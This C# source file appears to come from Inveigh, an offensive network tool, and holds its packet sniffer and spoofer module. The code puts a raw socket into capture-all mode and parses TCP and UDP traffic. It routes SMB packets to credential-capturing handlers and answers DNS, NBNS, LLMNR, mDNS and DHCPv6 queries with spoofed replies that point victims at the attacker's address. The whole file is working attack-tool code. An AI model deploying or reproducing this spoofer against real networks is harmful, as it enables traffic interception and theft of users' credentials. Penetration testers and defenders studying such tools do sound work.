using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Collections;

namespace Inveigh
{
    class Sniffer
    {
         // todo move

        public static void SnifferSpoofer(string ipVersion, string protocol, string snifferIP)
        {
            byte[] spooferIPData = IPAddress.Parse(Program.argSpooferIP).GetAddressBytes();
            byte[] spooferIPv6Data = new byte[16];
            byte[] snifferIn = new byte[4] { 1, 0, 0, 0 };
            byte[] snifferOut = new byte[4] { 1, 0, 0, 0 };
            byte[] snifferData = new byte[0];
            byte[] buffer = new byte[65534];
            Random ipv6Random = new Random();
            int ipv6RandomValue = ipv6Random.Next(1, 9999);
            byte[] snifferMACData = new byte[6];
            byte[] dhcpv6DomainSuffixData = Util.NewDNSNameArray(Program.argDHCPv6DNSSuffix, true);
            Socket snifferSocket;
            IPEndPoint snifferIPEndPoint;
            EndPoint snifferEndPoint;
            IPAddress destinationIPAddress = IPAddress.Parse(snifferIP);
            AddressFamily addressFamily = AddressFamily.InterNetwork;

            if (String.Equals(ipVersion, "IPv6"))
            {
                spooferIPv6Data = IPAddress.Parse(Program.argSpooferIPv6).GetAddressBytes();
                snifferEndPoint = new IPEndPoint(IPAddress.IPv6Any, 0);
                addressFamily = AddressFamily.InterNetworkV6;
                int i = 0;

                foreach (string character in Program.argMAC.Split(':'))
                {
                    snifferMACData[i] = Convert.ToByte(Convert.ToInt16(character, 16));
                    i++;
                }

            }
            else
            {
                snifferEndPoint = new IPEndPoint(IPAddress.Any, 0);
            }

            try
            {
                
                if (String.Equals(ipVersion, "IPv4"))
                {
                    snifferSocket = new Socket(addressFamily, SocketType.Raw, ProtocolType.IP);
                    snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
                }
                else
                {

                    if (String.Equals(protocol, "UDP"))
                    {
                        snifferSocket = new Socket(addressFamily, SocketType.Raw, ProtocolType.Udp);
                    }
                    else
                    {
                        snifferSocket = new Socket(addressFamily, SocketType.Raw, ProtocolType.IP);
                    }

                }

                snifferIPEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
                snifferSocket.ReceiveBufferSize = 65534;
                snifferSocket.Bind(snifferIPEndPoint);
                snifferSocket.IOControl(IOControlCode.ReceiveAll, snifferIn, snifferOut);
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[!] Error starting packet sniffer, check if shell has elevated privilege or set -Elevated N for unprivileged mode.", DateTime.Now.ToString("s")));
                }

                throw;
            }         
            
            int packetLength;
            string outputPcap = "";

            if (Program.enabledPcap)
            {
                byte[] pcapHeader = new byte[24] { 0xd4, 0xc3, 0xb2, 0xa1, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
                outputPcap = Path.Combine(Program.argFileOutputDirectory, String.Concat(Program.argFilePrefix, "-Packets.pcap"));
                bool existsPcapFile = File.Exists(outputPcap);

                Program.pcapFile = new FileStream(outputPcap, FileMode.Append, FileAccess.Write);

                if (!existsPcapFile)
                {
                    Program.pcapFile.Write(pcapHeader, 0, pcapHeader.Length);
                }

            }

            while (!Program.exitInveigh)
            {

                try
                {

                    try
                    {
                        packetLength = snifferSocket.ReceiveFrom(buffer, 0, buffer.Length, SocketFlags.None, ref snifferEndPoint);
                        snifferData = new byte[packetLength];
                        Buffer.BlockCopy(buffer, 0, snifferData, 0, packetLength);
                    }
                    catch
                    {
                        packetLength = 0;
                    }

                    if (packetLength > 0)
                    {
                        MemoryStream memoryStream = new MemoryStream(snifferData, 0, packetLength);
                        BinaryReader binaryReader = new BinaryReader(memoryStream);
                        IPAddress sourceIPAddress;
                        int protocolNumber;
                        byte[] sourceIPData = new byte[4];
                        byte[] destinationIPData = new byte[4];
                        string sourceIP = "";
                        string destinationIP = "";

                        if (String.Equals(ipVersion, "IPv4"))
                        {
                            byte versionHL = binaryReader.ReadByte();
                            binaryReader.ReadByte();
                            uint totalLength = Util.DataToUInt16(binaryReader.ReadBytes(2)); //this is 0 with tcp offload
                            binaryReader.ReadBytes(5);
                            protocolNumber = (int)binaryReader.ReadByte();
                            binaryReader.ReadBytes(2);
                            sourceIPData = binaryReader.ReadBytes(4);
                            sourceIPAddress = new IPAddress(sourceIPData);
                            sourceIP = sourceIPAddress.ToString();
                            destinationIPData = binaryReader.ReadBytes(4);
                            destinationIPAddress = new IPAddress(destinationIPData);
                            destinationIP = destinationIPAddress.ToString();
                            byte headerLength = versionHL;
                            headerLength <<= 4;
                            headerLength >>= 4;
                            headerLength *= 4;
                        }
                        else
                        {
                            sourceIPAddress = (snifferEndPoint as IPEndPoint).Address;
                            //protocolNumber = (int)snifferSocket.ProtocolType;

                            if (String.Equals(protocol, "UDP"))
                            {
                                protocolNumber = 17;
                            }
                            else
                            {
                                protocolNumber = 6;
                            }

                        }

                        switch (protocolNumber)
                        {
                            case 6:
                                int tcpSourcePortNumber = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                int tcpDestinationPortNumber = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                string tcpSourcePort = Convert.ToString(tcpSourcePortNumber);
                                string tcpDestinationPort = Convert.ToString(tcpDestinationPortNumber);
                                binaryReader.ReadBytes(8);
                                byte tcpHeaderLength = binaryReader.ReadByte();
                                tcpHeaderLength >>= 4;
                                tcpHeaderLength *= 4;

                                if (tcpHeaderLength >= 20)
                                {
                                    byte tcpFlags = binaryReader.ReadByte();
                                    binaryReader.ReadBytes(tcpHeaderLength - 15);
                                    byte[] payloadBytes = binaryReader.ReadBytes(packetLength);
                                    string tcpSession = sourceIP + ":" + tcpSourcePort;
                                    string tcpFlagsBinary = Convert.ToString(tcpFlags, 2);
                                    tcpFlagsBinary = tcpFlagsBinary.PadLeft(8, '0');

                                    if (String.Equals(tcpFlagsBinary.Substring(6, 1), "1") && String.Equals(tcpFlagsBinary.Substring(3, 1), "0") && destinationIP == snifferIP)
                                    {

                                        lock (Program.outputList)
                                        {
                                            Program.outputList.Add(String.Format("[-] [{0}] TCP({1}) SYN packet from {2}", DateTime.Now.ToString("s"), tcpDestinationPortNumber, tcpSession));
                                        }

                                    }

                                    switch (tcpDestinationPortNumber)
                                    {
                                        case 139:
                                            SMB.SMBIncoming(payloadBytes, destinationIPAddress, sourceIPAddress, snifferIP, tcpDestinationPortNumber, tcpSourcePortNumber);
                                            break;

                                        case 445:
                                            SMB.SMBIncoming(payloadBytes, destinationIPAddress, sourceIPAddress, snifferIP, tcpDestinationPortNumber, tcpSourcePortNumber);
                                            break;
                                    }

                                    switch (tcpSourcePortNumber)
                                    {
                                        case 139:
                                            SMB.SMBOutgoing(payloadBytes, destinationIPAddress, snifferIP, tcpDestinationPortNumber, tcpSourcePortNumber);
                                            break;

                                        case 445:
                                            SMB.SMBOutgoing(payloadBytes, destinationIPAddress, snifferIP, tcpDestinationPortNumber, tcpSourcePortNumber);
                                            break;
                                    }

                                    if (Program.enabledPcap && String.Equals(ipVersion, "IPv4") && (Program.argPcapTCP != null && Program.argPcapTCP.Length > 0 && (Array.Exists(Program.argPcapTCP, element => element == tcpSourcePort) ||
                                        Array.Exists(Program.argPcapTCP, element => element == tcpDestinationPort) || Array.Exists(Program.argPcapTCP, element => element == "ALL"))))
                                    {
                                        PcapOutput((uint)packetLength, snifferData);
                                    }

                                }

                                break;

                            case 17:
                                byte[] udpSourcePortData = binaryReader.ReadBytes(2);
                                int udpSourcePortNumber = Util.DataToUInt16(udpSourcePortData);
                                string udpSourcePort = Convert.ToString(udpSourcePortNumber);
                                byte[] udpDestinationPortData = binaryReader.ReadBytes(2);
                                int udpDestinationPortNumber = Util.DataToUInt16(udpDestinationPortData);
                                int udpLength = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                binaryReader.ReadBytes(2);
                                byte[] udpPayload;

                                try
                                {
                                    udpPayload = binaryReader.ReadBytes(((int)udpLength - 2) * 4);
                                }
                                catch
                                {
                                    udpPayload = new byte[2];
                                }

                                switch (udpDestinationPortNumber)
                                {

                                    case 53:
                                        DNS.DNSReply("sniffer", ipVersion, udpSourcePortData, udpPayload, sourceIPAddress, destinationIPAddress, null, null);
                                        break;

                                    case 137:

                                        if (String.Equals(ipVersion, "IPv4"))
                                        {
                                            NBNS.NBNSReply("sniffer", udpSourcePortData, udpPayload, sourceIPAddress, destinationIPAddress, null, null);
                                        }
                                            
                                        break;

                                    case 547:

                                        if (String.Equals(ipVersion, "IPv6"))
                                        {
                                            DHCPv6.DHCPv6Reply("sniffer", udpSourcePortData, udpPayload, sourceIPAddress, destinationIPAddress, null, null);
                                        }

                                        break;

                                    case 5353:
                                        MDNS.MDNSReply("sniffer", ipVersion, udpSourcePortData, udpPayload, sourceIPAddress, destinationIPAddress, null, null);
                                        break;

                                    case 5355:
                                        LLMNR.LLMNRReply("sniffer", ipVersion, udpSourcePortData, udpPayload, sourceIPAddress, destinationIPAddress, null, null);
                                        break;
                                }

                                if (Program.enabledPcap && String.Equals(ipVersion, "IPv4") && (Program.argPcapUDP != null && Program.argPcapUDP.Length > 0 && (Array.Exists(Program.argPcapUDP, element => element == udpSourcePort) ||
                                   Array.Exists(Program.argPcapUDP, element => element == udpSourcePortNumber.ToString()) || Array.Exists(Program.argPcapUDP, element => element == "ALL"))))
                                {
                                    PcapOutput((uint)packetLength, snifferData);
                                }

                                break;
             
                        }

                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] Packet sniffing error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static void PcapOutput(uint totalLength, byte[] byteData)
        {

            if (byteData != null && byteData.Length > 0)
            {
                TimeSpan pcapEpochTime = DateTime.UtcNow - new DateTime(1970, 1, 1);
                byte[] pcapLength = BitConverter.GetBytes(totalLength + 14);
                byte[] pcapEpochTimeSeconds = BitConverter.GetBytes((int)pcapEpochTime.TotalSeconds);

                using (MemoryStream ms = new MemoryStream())
                {
                    ms.Write((BitConverter.GetBytes((int)Math.Truncate(pcapEpochTime.TotalSeconds))), 0, (BitConverter.GetBytes((int)pcapEpochTime.TotalSeconds)).Length);
                    ms.Write((BitConverter.GetBytes(pcapEpochTime.Milliseconds)), 0, (BitConverter.GetBytes(pcapEpochTime.Milliseconds)).Length);
                    ms.Write(pcapLength, 0, pcapLength.Length);
                    ms.Write(pcapLength, 0, pcapLength.Length);
                    ms.Write((new byte[12] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 12);
                    ms.Write((new byte[2] { 0x08, 0x00 }), 0, 2);
                    ms.Write(byteData, 0, (int)totalLength);

                    if (ms.ToArray().Length == totalLength + 30)
                    {
                        Program.pcapFile.Write(ms.ToArray(), 0, ms.ToArray().Length);
                    }

                }

            }

        }

    }

}
